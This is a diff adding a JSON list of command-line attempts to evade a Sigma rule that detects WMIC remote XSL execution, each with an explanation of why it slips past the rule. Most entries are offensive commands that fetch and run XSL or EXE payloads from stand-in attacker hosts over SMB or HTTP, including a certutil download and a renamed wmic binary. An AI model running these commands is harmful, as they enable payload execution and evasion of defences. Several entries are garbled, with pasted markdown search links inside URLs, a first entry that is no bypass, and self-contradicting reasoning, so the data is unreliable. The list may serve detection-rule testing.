@@ -1,0 +1,38 @@
+[
+  {
+    "output": "C:\\\\Windows\\\\System32\\\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
+    "explanation": ""
+  },
+  {
+    "output": "wmic os get /format:\"\\\\\\\\attacker-smb-server\\\\share\\\\payload.xsl\"",
+    "explanation": "The Sigma rule relies on the exact presence of the 'http' string in the command line. By hosting the malicious XSL payload on an SMB share and referencing it via a UNC path instead of an HTTP server, the command completely bypasses the 'http' keyword check while still achieving remote XSL execution."
+  },
+  {
+    "output": "wmic os get /format:\"C:\\\\Windows\\\\Temp\\\\dropped_payload.xsl\"",
+    "explanation": "The rule assumes the attacker is fetching the payload remotely over HTTP in a single command. An attacker can bypass this by splitting the attack into two stages: first dropping the XSL file to disk using another mechanism, and then executing it locally using wmic, which avoids the 'http' condition entirely."
+  },
+  {
+    "output": "certutil -urlcache -split -f http://malicious-site.com/payload.exe C:\\temp\\payload.exe",
+    "explanation": "This bypasses the rule by using certutil.exe instead of wmic.exe. The rule specifically looks for wmic.exe (with specific imphashes and OriginalFileName) in the process image. Using certutil, which is another Living Off the Land Binary (LOLBin), accomplishes the same download functionality but doesn't match the selection_pe criteria since the process is certutil.exe, not wmic.exe. The command line also doesn't contain both 'format:' and 'http' together."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\wbem\\wmic.exe C:\\Windows\\Temp\\not_wmic.exe && C:\\Windows\\Temp\\not_wmic.exe /node:127.0.0.1 process list /format:\"\\\\AttackerServer\\share\\evil.xsl\"",
+    "explanation": "The original Sigma rule relies on the command line containing 'http' to detect remote XSL fetching. By using an SMB share path (UNC path) instead of a URL, the 'http' string is avoided, bypassing the selection_cli criteria while still achieving remote payload execution."
+  },
+  {
+    "output": "wmic process list /format:\"C:\\Windows\\Temp\\local_script.xsl\"",
+    "explanation": "The rule specifically looks for 'http' within the command line, assuming a remote SquiblyTwo attack. If an attacker first downloads the XSL file via another method (like certutil or bitsadmin) and then executes wmic pointing to the local file, the 'http' keyword is not present, thus bypassing selection_cli."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\wbem\\WMIC.exe C:\\Users\\Public\\Update.exe && C:\\Users\\Public\\Update.exe os get /format:\"\\\\UNCPath\\Payload.xsl\"",
+    "explanation": "The rule is bypassed by avoiding the 'http' string in the command line. By hosting the XSL stylesheet on an SMB/UNC share instead of a web server, the 'selection\\_cli' logic (which requires both 'format:' and 'http') fails to trigger while still executing the SquiblyTwo technique."
+  },
+  {
+    "output": "wmic os get /format:\"h\"t\"t\"p://[attacker.com/evil.xsl](https://www.google.com/search?q=https://attacker.com/evil.xsl)\"",
+    "explanation": "The rule uses a simple 'contains' check for the string 'http'. Using environment variables or command-line obfuscation (like inserting empty double quotes in the middle of the protocol string) can break the literal string match depending on how the specific SIEM parses and normalizes the command line."
+  },
+  {
+    "output": "$h='http'; wmic os get /format:\"$($h)://[attacker.com/evil.xsl](https://www.google.com/search?q=https://attacker.com/evil.xsl)\"",
+    "explanation": "Executing the command through a wrapper like PowerShell where the 'http' string is constructed dynamically or stored in a variable ensures the process creation event for wmic.exe contains the resolved URL, but may bypass static signature-based detections that look for the literal 'http' in conjunction with wmic execution if the logic is not robust against variable expansion."
+  }
+]
